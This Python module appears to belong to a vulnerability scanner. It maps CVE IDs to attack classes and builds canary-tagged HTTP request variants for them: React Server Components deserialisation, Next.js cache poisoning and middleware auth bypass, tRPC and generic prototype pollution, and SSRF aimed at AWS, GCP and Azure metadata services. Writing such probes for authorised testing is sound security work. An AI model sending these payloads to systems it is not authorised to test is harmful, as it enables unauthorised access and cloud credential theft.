"""CVE→class map + variant generators — extracted from cve_variant_probe.py (split 2026-07-23)."""

from __future__ import annotations

import re
from typing import Any

# ----- CVE → class map -------------------------------------------------------
# Operator-curated. Add new CVEs as KB intake catches them.
# Pattern matches "CVE-YYYY-NNNN" loosely so aliases (e.g. "react2shell") route.
_CVE_TO_CLASS: dict[str, str] = {
    # React Server Components — "react2shell" family
    "CVE-2025-55182": "react_server_components",
    "CVE-2025-66478": "react_server_components",
    "react2shell":    "react_server_components",
    # Next.js cache poisoning
    "CVE-2024-46982": "nextjs_cache_poisoning",
    "CVE-2025-29927": "nextjs_cache_poisoning",
    # tRPC SSPP
    "CVE-2025-68130": "trpc_sspp",
    # 2026 H2 prototype pollution
    "CVE-2026-40175": "prototype_pollution",
    "CVE-2026-44789": "prototype_pollution",
    "CVE-2026-44790": "prototype_pollution",
    "CVE-2026-44791": "prototype_pollution",
    # 2026 H2 Next.js WebSocket Upgrade SSRF
    "CVE-2026-44578": "nextjs_ws_upgrade_ssrf",
    # Next.js May-2026 middleware bypass (Vercel-official, Spec D D4)
    "CVE-2026-44575": "nextjs_middleware_bypass",
    "CVE-2026-44574": "nextjs_middleware_bypass",
}


def _resolve_class(cve_id: str, explicit_class: str) -> str:
    if explicit_class:
        return explicit_class.strip().lower()
    key = cve_id.strip().upper()
    if key in _CVE_TO_CLASS:
        return _CVE_TO_CLASS[key]
    # Lowercase alias lookup (e.g. "react2shell")
    low = cve_id.strip().lower()
    for k, v in _CVE_TO_CLASS.items():
        if k.lower() == low:
            return v
    return "generic"


# ----- Variant generators ----------------------------------------------------
# Each returns list[dict(label, method, headers, body, content_type)] in
# priority order. Highest-yield variants FIRST so first-CONFIRMED short-circuit
# pays off.

def _rsc_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """React Server Components — CVE-2025-55182 / CVE-2025-66478.

    Different prod stacks accept different RSC chunk syntaxes. Public PoC
    typically uses ONE shape; we sweep the four known-accepted shapes plus
    Next-Action header permutations.
    """
    aid = action_id or "0000000000000000000000000000000000000000"
    variants: list[dict[str, Any]] = []

    # Shape A — bare children chunk (classic React2Shell)
    variants.append({
        "label": "rsc.children_chunk",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": f'0:["$","$L1",null,{{"children":"{canary}"}}]\n',
    })
    # Shape B — multipart Server Action (Next.js >= 14)
    boundary = "----PraetorRSC"
    variants.append({
        "label": "rsc.multipart_action",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Accept": "text/x-component",
        },
        "body": (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="0"\r\n\r\n'
            f'["{canary}"]\r\n'
            f"--{boundary}--\r\n"
        ),
    })
    # Shape C — urlencoded form-state replay
    variants.append({
        "label": "rsc.form_state_urlencoded",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded",
            "x-rsc-form-state": '{"__proto__":{"polluted":"' + canary + '"}}',
            "Accept": "text/x-component",
        },
        "body": f"$ACTION_REF_1={canary}",
    })
    # Shape D — RSC chunk reference with $1@ syntax (deserialisation entry)
    variants.append({
        "label": "rsc.dollar_ref",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": f'1:"${{"canary":"{canary}"}}"\n2:[1]\n',
    })
    # Shape E — header-only canary in Next-Url (route-unbound variant)
    variants.append({
        "label": "rsc.next_url_canary",
        "method": "POST",
        "headers": {
            "Next-Action": aid,
            "Next-Url": f"/{canary}",
            "Content-Type": "text/plain;charset=UTF-8",
            "Accept": "text/x-component",
        },
        "body": "0:{}\n",
    })
    # Shape F — operator-supplied baseline with header trio injected
    if baseline:
        variants.append({
            "label": "rsc.baseline_with_headers",
            "method": "POST",
            "headers": {
                "Next-Action": aid,
                "Content-Type": "text/plain;charset=UTF-8",
                "Accept": "text/x-component",
            },
            "body": baseline.replace("__CANARY__", canary),
        })
    return variants


def _nextjs_cache_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Next.js cache poisoning — x-now-route-matches family."""
    variants = []
    variants.append({
        "label": "next.x_now_route_matches",
        "method": "GET",
        "headers": {"x-now-route-matches": f"1={canary}"},
        "body": "",
    })
    variants.append({
        "label": "next.middleware_subrequest_bypass",
        "method": "GET",
        "headers": {"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware"},
        "body": "",
    })
    variants.append({
        "label": "next.invoke_path_collision",
        "method": "GET",
        "headers": {
            "x-invoke-path": f"/api/{canary}",
            "x-invoke-output": f"/{canary}",
        },
        "body": "",
    })
    variants.append({
        "label": "next.prerender_revalidate_canary",
        "method": "GET",
        "headers": {
            "x-prerender-revalidate": canary,
            "x-vercel-internal": "1",
        },
        "body": "",
    })
    if baseline:
        variants.append({
            "label": "next.baseline_with_canary_header",
            "method": "GET",
            "headers": {"x-now-route-matches": baseline.replace("__CANARY__", canary)},
            "body": "",
        })
    return variants


def _trpc_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """tRPC SSPP — CVE-2025-68130. Server-side prototype pollution via batch
    input rehydration."""
    variants = []
    variants.append({
        "label": "trpc.batch_proto",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": f'{{"0":{{"json":{{"__proto__":{{"polluted":"{canary}"}}}}}}}}',
    })
    variants.append({
        "label": "trpc.batch_constructor",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "body": f'{{"0":{{"json":{{"constructor":{{"prototype":{{"polluted":"{canary}"}}}}}}}}}}',
    })
    variants.append({
        "label": "trpc.querystring_proto",
        "method": "GET",
        "headers": {},
        "body": "",
        "query": f"batch=1&input=%7B%220%22%3A%7B%22json%22%3A%7B%22__proto__%22%3A%7B%22polluted%22%3A%22{canary}%22%7D%7D%7D%7D",
    })
    return variants


def _proto_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Prototype pollution — axios / n8n / general JS deep-merge sinks."""
    variants = []
    bodies = [
        ("proto.dunder", f'{{"__proto__":{{"polluted":"{canary}"}}}}'),
        ("proto.constructor", f'{{"constructor":{{"prototype":{{"polluted":"{canary}"}}}}}}'),
        ("proto.nested_dunder", f'{{"a":{{"__proto__":{{"polluted":"{canary}"}}}}}}'),
        ("proto.unicode_key", f'{{"\\u005f\\u005fproto\\u005f\\u005f":{{"polluted":"{canary}"}}}}'),
        ("proto.array_proto", f'{{"a":[{{"__proto__":{{"polluted":"{canary}"}}}}]}}'),
    ]
    for label, body in bodies:
        variants.append({
            "label": label,
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": body,
        })
    if baseline:
        variants.append({
            "label": "proto.baseline",
            "method": "POST",
            "headers": {"Content-Type": "application/json"},
            "body": baseline.replace("__CANARY__", canary),
        })
    return variants


def _nextjs_ws_ssrf_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Next.js WebSocket Upgrade SSRF — CVE-2026-44578.

    Server-side proxy upgrade fetches the Host without filtering loopback
    or cloud-metadata addresses. Sweep the four canonical metadata Hosts
    plus a Collaborator placeholder.
    """
    variants: list[dict[str, Any]] = []
    # AWS IMDS via WS upgrade
    variants.append({
        "label": "ws_ssrf.aws_imds",
        "method": "GET",
        "headers": {
            "Host": "169.254.169.254",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    # GCP metadata
    variants.append({
        "label": "ws_ssrf.gcp_metadata",
        "method": "GET",
        "headers": {
            "Host": "metadata.google.internal",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Metadata-Flavor": "Google",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    # Azure IMDS
    variants.append({
        "label": "ws_ssrf.azure_imds",
        "method": "GET",
        "headers": {
            "Host": "169.254.169.254",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Metadata": "true",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    # Loopback
    variants.append({
        "label": "ws_ssrf.loopback",
        "method": "GET",
        "headers": {
            "Host": "127.0.0.1",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    # X-Forwarded-Host variant (some proxies trust this)
    variants.append({
        "label": "ws_ssrf.xfh_imds",
        "method": "GET",
        "headers": {
            "X-Forwarded-Host": "169.254.169.254",
            "Upgrade": "websocket",
            "Connection": "upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
            "X-Praetor-Canary": canary,
        },
        "body": "",
    })
    return variants


def _generic_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Fallback when CVE class is unknown: encoding-chain mutations on
    operator-supplied baseline. Hard-bounded by max_variants caller cap."""
    if not baseline:
        return []
    from urllib.parse import quote
    base = baseline.replace("__CANARY__", canary)
    variants = []
    variants.append({"label": "gen.raw", "method": "POST",
                     "headers": {"Content-Type": "application/json"},
                     "body": base})
    variants.append({"label": "gen.url_encoded", "method": "POST",
                     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                     "body": "p=" + quote(base, safe="")})
    variants.append({"label": "gen.double_url_encoded", "method": "POST",
                     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                     "body": "p=" + quote(quote(base, safe=""), safe="")})
    variants.append({"label": "gen.json_string_escaped", "method": "POST",
                     "headers": {"Content-Type": "application/json"},
                     "body": '{"p":' + repr(base) + "}"})
    variants.append({"label": "gen.header_smuggle", "method": "POST",
                     "headers": {"Content-Type": "application/json",
                                 "X-Forwarded-Payload": base[:200]},
                     "body": '{"canary":"' + canary + '"}'})
    return variants


def _nextjs_middleware_variants(baseline: str, canary: str, action_id: str) -> list[dict[str, Any]]:
    """Next.js May-2026 middleware bypass (Vercel-official, Spec D D4).

    CVE-2026-44575: App Router `.rsc` / segment-prefetch URLs reach protected
    content, skipping middleware. CVE-2026-44574: a crafted query param alters
    the dynamic-route value, hiding the path from middleware. `target_url` should
    be the protected route (e.g. https://app/admin). A 200 with RSC content where
    the base route returns 302/403 is the bypass signal — compare vs baseline.
    """
    variants: list[dict[str, Any]] = []
    # CVE-2026-44575: .rsc suffix on the path skips middleware auth.
    variants.append({
        "label": "mw_bypass.rsc_suffix", "method": "GET",
        "url_suffix": ".rsc",
        "headers": {"RSC": "1", "X-Praetor-Canary": canary}, "body": "",
    })
    # CVE-2026-44575: segment-prefetch header form.
    variants.append({
        "label": "mw_bypass.segment_prefetch", "method": "GET",
        "headers": {"Next-Router-Prefetch": "1", "RSC": "1",
                    "Next-Router-State-Tree": "%5B%22%22%5D",
                    "X-Praetor-Canary": canary}, "body": "",
    })
    # CVE-2026-44574: query param alters dynamic route value, hides path from mw.
    variants.append({
        "label": "mw_bypass.query_route_override", "method": "GET",
        "query": f"__nextDataReq=1&_rsc={canary[:8]}",
        "headers": {"X-Praetor-Canary": canary}, "body": "",
    })
    return variants


_GENERATORS: dict[str, Any] = {
    "react_server_components": _rsc_variants,
    "nextjs_cache_poisoning":  _nextjs_cache_variants,
    "nextjs_middleware_bypass": _nextjs_middleware_variants,
    "trpc_sspp":               _trpc_variants,
    "prototype_pollution":     _proto_variants,
    "nextjs_ws_upgrade_ssrf":  _nextjs_ws_ssrf_variants,
    "generic":                 _generic_variants,
}

